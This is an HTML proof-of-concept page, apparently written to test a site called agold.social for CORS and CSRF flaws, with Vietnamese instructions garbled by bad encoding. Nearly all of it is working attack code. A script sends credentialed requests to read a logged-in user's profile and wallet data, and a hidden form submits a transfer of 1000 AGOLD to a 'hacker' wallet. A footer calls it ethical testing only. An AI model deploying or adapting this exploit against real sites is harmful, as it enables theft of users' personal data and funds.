<!DOCTYPE html>
<html>
<head>
  <title>Agold.social - CORS + CSRF Full PoC</title>
  <style>
    body { font-family: Arial; text-align: center; margin: 20px; background: #f0f0f0; }
    h1 { color: #d32f2f; }
    .test-btn { padding: 10px 20px; margin: 10px; background: #2196F3; color: white; border: none; border-radius: 5px; cursor: pointer; }
    .csrf-btn { background: #f44336 !important; }
    pre { background: #f4f4f4; padding: 15px; border-radius: 8px; text-align: left; display: inline-block; max-width: 80%; margin: 10px; }
    .status-safe { color: green; }
    .status-vuln { color: red; }
    .hidden { display: none; }
  </style>
</head>
<body>
  <h1>ğŸ”¥ Agold.social - CORS & CSRF Exploit Tester</h1>
  <p><b>HÆ°á»›ng dáº«n:</b> Má»Ÿ <b>Tab 1</b>: ÄÄƒng nháº­p agold.social â†’ <b>Tab 2</b>: Trang nÃ y â†’ Click test</p>

  <h2>ğŸ›¡ï¸ Test CORS (Láº¥y profile/wallet)</h2>
  <button class="test-btn" onclick="testEndpoints()">Test All Endpoints</button>
  <pre id="corsResult">Click Ä‘á»ƒ test...</pre>

  <h2>ğŸ’¥ Test CSRF (Chuyá»ƒn tiá»n giáº£ láº­p)</h2>
  <p>Click Ä‘á»ƒ gá»­i form POST (náº¿u lá»— há»•ng CSRF â†’ tiá»n bá»‹ chuyá»ƒn!)</p>
  <button class="test-btn csrf-btn" onclick="testCSRF()">Exploit CSRF: Chuyá»ƒn 1000 AGOLD</button>
  <form id="csrfForm" class="hidden" method="POST" action="https://gateway.agold.social/api/v1/transfer">
    <input type="hidden" name="to" value="hacker_wallet_abc123">
    <input type="hidden" name="amount" value="1000">
  </form>

  <script>
    const endpoints = [
      '/api/v1/user/profile',
      '/api/v1/wallet/balance',
      '/api/v1/user/info',
      '/api/user'
    ];

    async function testEndpoints() {
      const result = document.getElementById('corsResult');
      result.textContent = 'Testing...\n\n';
      
      for (let path of endpoints) {
        try {
          const res = await fetch(`https://gateway.agold.social${path}`, {
            method: 'GET',
            credentials: 'include'  // Gá»­i cookie náº¿u login
          });
          if (res.ok && res.headers.get('access-control-allow-origin')) {
            const data = await res.text();
            result.textContent += `âœ… VULN: ${path}\nStatus: ${res.status}\nData: ${data.substring(0, 200)}...\n\n`;
            result.className = 'status-vuln';
          } else {
            result.textContent += `ğŸš« SAFE: ${path} (CORS Blocked)\nStatus: ${res.status}\n\n`;
          }
        } catch (err) {
          result.textContent += `ğŸš« SAFE: ${path} (Failed to fetch - CORS Blocked)\nError: ${err.message}\n\n`;
        }
      }
    }

    function testCSRF() {
      alert('ğŸš¨ CSRF EXPLOIT: Äang gá»­i yÃªu cáº§u chuyá»ƒn 1000 AGOLD Ä‘áº¿n hacker!');
      document.getElementById('csrfForm').submit();
    }
  </script>
  <hr>
  <p><small>PoC ethical only. Report náº¿u tÃ¬m tháº¥y vuln!</small></p>
</body>
</html>
